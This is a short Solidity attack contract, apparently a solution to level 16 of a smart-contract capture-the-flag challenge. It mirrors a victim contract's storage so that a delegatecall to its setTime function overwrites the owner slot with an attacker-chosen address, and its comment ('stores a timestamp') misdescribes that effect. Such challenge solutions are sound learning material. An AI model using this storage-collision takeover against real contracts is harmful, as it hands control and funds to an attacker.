// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract L16Attack {
    // stores a timestamp
    address firstSlot;
    address secondSlot;
    address owner;

    function setTime(uint256 value) public {
        owner = address(uint160(value));
    }
}
